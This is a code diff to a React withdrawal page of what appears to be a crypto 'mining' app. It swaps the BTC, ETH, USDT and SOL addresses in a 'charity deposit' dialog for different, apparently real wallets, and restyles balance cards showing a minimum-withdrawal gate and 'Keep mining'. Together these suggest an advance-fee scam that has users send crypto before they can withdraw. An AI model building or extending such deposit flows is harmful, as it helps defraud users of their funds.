@@ -356,10 +356,10 @@ function ProcessingScreen({ withdrawal, onDone }) {
 // CHARITY DEPOSIT DIALOG
 // ─────────────────────────────────────────────────────────────────────────────
 const CHARITY_WALLETS = {
-  btc:  "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
-  eth:  "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
-  usdt: "TRx8qPnrAXMynPdmfGbSjdqTvVj7sWRq4N",
-  sol:  "7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs",
+  btc:  "1G3mwdjDKdh9q5r55Ryr3iTVKW3gZ9gxAw",
+  eth:  "0x55cfe95453a9fad990290aae7af8c0cf791e2a35",
+  usdt: "TGuQrmGpKFBkUFticKpsmG4trCM25nRHZC",
+  sol:  "45mE67qg2vMs3Gw7rKXmStjTqvnW5D8GCEgpx7xhoB76",
 };
 
 const CHARITY_AMOUNTS = {
@@ -868,15 +868,15 @@ export default function WithdrawalPage({ onBack }) {
         {/* BALANCE OVERVIEW CARDS */}
         <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr 1fr" : "repeat(4,1fr)", gap: 10, marginBottom: 20, animation: "fadeIn 0.5s ease 0.1s both" }}>
           {[
-            { label: "Available",    value: fmtBig(balance),        sub: canWithdraw ? "✓ Ready" : `Need $${fmtBig(MIN_WITHDRAWAL - balance)} more`, color: canWithdraw ? "#00c896" : "#e31937", accent: canWithdraw ? "rgba(0,200,150,0.07)" : "rgba(227,25,55,0.07)" },
-            { label: "Withdrawn",    value: fmtBig(totalWithdrawn), sub: `${withdrawals.filter(w => w.status==="Completed").length} done`,            color: "#6366f1", accent: "rgba(99,102,241,0.07)" },
-            { label: "Pending",      value: String(pendingCount),   sub: pendingCount > 0 ? "In progress" : "All clear",                              color: pendingCount > 0 ? "#f59e0b" : "#444", accent: "rgba(255,255,255,0.02)" },
-            { label: "Min. Limit",   value: `$${MIN_WITHDRAWAL.toLocaleString()}`, sub: canWithdraw ? "Met ✓" : "Keep mining",                        color: "#888", accent: "rgba(255,255,255,0.02)" },
+            { label: "Available",  value: fmtBig(balance),        sub: canWithdraw ? "✓ Ready" : `$${fmtBig(MIN_WITHDRAWAL - balance)} more`, color: canWithdraw ? "#00c896" : "#e31937", accent: canWithdraw ? "rgba(0,200,150,0.07)" : "rgba(227,25,55,0.07)" },
+            { label: "Withdrawn",  value: fmtBig(totalWithdrawn), sub: `${withdrawals.filter(w=>w.status==="Completed").length} done`, color: "#6366f1", accent: "rgba(99,102,241,0.07)" },
+            { label: "Pending",    value: String(pendingCount),   sub: pendingCount > 0 ? "In progress" : "All clear", color: pendingCount > 0 ? "#f59e0b" : "#444", accent: "rgba(255,255,255,0.02)" },
+            { label: "Min.",       value: `$${MIN_WITHDRAWAL.toLocaleString()}`, sub: canWithdraw ? "Met ✓" : "Keep mining", color: "#888", accent: "rgba(255,255,255,0.02)" },
           ].map(({ label, value, sub, color, accent }) => (
-            <div key={label} style={{ ...card, padding: "12px 14px", background: accent }}>
-              <div style={{ fontSize: 8, color: "#444", letterSpacing: 1.5, textTransform: "uppercase", marginBottom: 5 }}>{label}</div>
-              <div style={{ fontSize: isMobile ? 16 : 20, fontWeight: 800, color, lineHeight: 1, marginBottom: 3, fontFamily: "'Syne',sans-serif" }}>{value}</div>
-              <div style={{ fontSize: 9, color: "#444" }}>{sub}</div>
+            <div key={label} style={{ ...card, padding: isMobile ? "10px 12px" : "12px 14px", background: accent }}>
+              <div style={{ fontSize: 8, color: "#444", letterSpacing: 1, textTransform: "uppercase", marginBottom: 4 }}>{label}</div>
+              <div style={{ fontSize: isMobile ? 14 : 20, fontWeight: 800, color, lineHeight: 1, marginBottom: 3, fontFamily: "'Syne',sans-serif", whiteSpace: "nowrap" }}>{value}</div>
+              <div style={{ fontSize: 9, color: "#444", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{sub}</div>
             </div>
           ))}
         </div>
